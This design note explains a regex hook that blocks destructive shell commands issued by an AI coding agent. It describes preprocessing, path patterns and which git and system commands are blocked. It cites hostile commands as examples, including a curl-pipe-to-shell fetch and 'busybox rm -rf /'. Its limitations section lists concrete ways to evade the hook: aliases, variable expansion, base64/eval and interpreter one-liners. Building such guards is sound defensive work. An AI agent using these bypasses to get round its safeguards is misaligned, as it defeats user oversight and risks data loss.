# Block Commands — Design Rationale

## Why Regex

The community consensus across projects (dcg, claude-code-safety-net, Trail of Bits config) is that regex-based command blocking covers 90%+ of the practical threat surface. AST parsing (Oil Shell parser, tree-sitter-bash) would be structurally correct but adds complexity, latency, and a native dependency. The hook runs on every Bash tool call — it must be fast and zero-dependency.

Regex with mitigations (heredoc stripping, path normalization, chain splitting) is the accepted tradeoff.

## Preprocessing Pipeline

Every command passes through a 5-stage pipeline before pattern matching:

```
Raw command
  │
  ├─ 1. Heredoc strip ──── Remove everything after `<<` to avoid
  │                         false positives from string literals
  ├─ 2. Backslash normalize ─ Replace `\` with `/` so Windows paths
  │                            (C:\Windows\) and MSYS paths (/c/Windows/)
  │                            match the same patterns
  ├─ 3. Presplit pattern check ─ Match patterns that intentionally span
  │                               pipes (e.g. `curl|sh`), before splitting
  ├─ 4. Chain split ──────── Split on `&&`, `||`, `;`, `|` respecting
  │                           quoted strings (single and double)
  └─ 5. Per-segment check ─ Match each segment against BLOCKED_PATTERNS
```

### Why each step exists

1. **Heredoc strip** — Without this, `git commit -m "$(cat <<'EOF'\ngit add blocked\nEOF\n)"` would false-positive on `git add` inside the string literal.

2. **Backslash normalization** — Windows uses `\` in paths. Git Bash uses `/`. MSYS2 converts paths. By normalizing to `/` early, `_PATH` patterns work uniformly across all environments.

3. **Presplit patterns** — `curl https://example.com | sh` must be caught as a unit. If we split on `|` first, we'd only see `curl https://example.com` (safe) and `sh` (safe individually). The presplit check catches the dangerous combination.

4. **Chain splitting** — `echo hi && git push` must block on `git push`. Without splitting, patterns would need to handle arbitrary prefixes. The splitter respects quotes so `echo "foo && bar"` stays as one segment.

5. **Per-segment check** — After splitting, each segment is independently matched. This is simpler and more reliable than trying to match patterns across chain operators.

## Case Sensitivity Strategy

- **Unix commands**: Case-sensitive. `rm` is not `RM` on Linux. Matching OS behavior.
- **Windows/PowerShell commands**: Case-insensitive (`re.IGNORECASE`). `DISKPART` = `diskpart` = `DiskPart`. Matching OS behavior.
- **Git commands**: Case-sensitive (Git itself is case-sensitive on all platforms).

## Path Handling

### `_PATH` pattern

```python
_PATH = r"(?:[a-zA-Z0-9_.:/-]*/)?"
```

Handles:
- Unix paths: `/usr/bin/git`, `./bin/git`
- Windows paths (after normalization): `C:/Windows/System32/reg.exe`
- MSYS2 paths: `/c/Windows/System32/reg.exe`
- Drive letters: The `:` in the character class handles `C:` in `C:/...`

### `_EXE` pattern

```python
_EXE = r"(?:\.exe)?"
```

Optional `.exe` suffix on all commands. Harmless on Unix (no one types `git.exe`), required on Windows where the actual binary name includes the extension.

## `_WFLAGS` vs `_FLAGS`

### `_FLAGS` (Unix-style)

```python
_FLAGS = r"(?:\s+(?:-\S+|\S+=\S+)(?:\s+\S+)?)*"
```

Matches `-C /path`, `--git-dir=/tmp/.git`, `-c user.name=test`. Used between a command and its subcommand (e.g., `git -C /path push`).

### `_WFLAGS` (Windows-style)

```python
_WFLAGS = r"(?:\s+/[a-zA-Z])*"
```

Matches `/q`, `/f`, `/S` — Windows single-letter flags. Separate from `_FLAGS` because `/path` looks like a Unix path. `_WFLAGS` is intentionally narrow (single letter only) to avoid matching path arguments.

Used in Windows patterns like `cipher /a /w:C:\temp` where `/a` is a flag before the destructive `/w`.

## Overly Broad vs. Narrow — Intentional Decisions

### Kept broad (block all variants)

| Command | Rationale |
|---------|-----------|
| `git reset` | Even `--soft` can lose staged work in the wrong context. All variants have destructive potential. |
| `git add` | The hook blocks `git add` because the user's workflow requires manual staging control. |
| `git push` | Any push affects remote state. No "safe" variant exists. |

### Narrowed to block only destructive variants

| Command | Allowed | Blocked | Rationale |
|---------|---------|---------|-----------|
| `git branch` | `--list`, `-a`, `-r`, `-v`, `--contains`, bare `git branch` | `-d`, `-D`, `--delete`, `-m`, `-M`, `--move`, `-c`, `-C`, `--copy` | Read-only operations are safe |
| `git stash` | `list`, `show` | Everything else (bare `stash`, `drop`, `clear`, `pop`, `apply`) | `list` and `show` are read-only. Bare `stash` implicitly pushes (modifies state). `pop`/`apply` modify working tree. |
| `git clean` | `-n`, `--dry-run` | Everything else | Dry-run is a safe preview that shows what *would* be deleted |
| `dd` | `of=test.img` (file output) | `of=/dev/*` (device output) | Writing to files is legitimate; writing to block devices is destructive |
| `sc` | `query`, `start`, `stop` | `delete` | Only `delete` is irreversible |

## Known Limitations

These bypasses are **out of scope** for regex matching. The hook is a safety net, not a sandbox.

- **Symlinks/aliases** — `ln -s /usr/bin/git mygit && mygit push` bypasses detection
- **Busybox multi-call binary** — `busybox rm -rf /` won't match `rm` pattern
- **Shell function overrides** — A function named `git` that calls the real binary with different args
- **`command`/`builtin` prefixes** — `command git push` may not match if `command` isn't in the pattern
- **Variable expansion** — `cmd="git push"; $cmd` is invisible to regex
- **Base64/eval encoding** — Encoded commands decoded and piped to a shell
- **Interpreter one-liners** — Running destructive commands through Python/Node/Ruby interpreters

## Sources

- [dcg](https://github.com/dcg) — Community Claude Code safety patterns
- [claude-code-safety-net](https://github.com/anthropics/claude-code) — Reference hook implementations
- Claude Code issues [#29085](https://github.com/anthropics/claude-code/issues/29085), [#28784](https://github.com/anthropics/claude-code/issues/28784) — Windows command blocking requests
- [MSYS2 path conversion](https://www.msys2.org/docs/filesystem-paths/) — How MSYS2/Git Bash converts paths
- [PowerShell Constrained Language Mode](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes) — PowerShell security reference
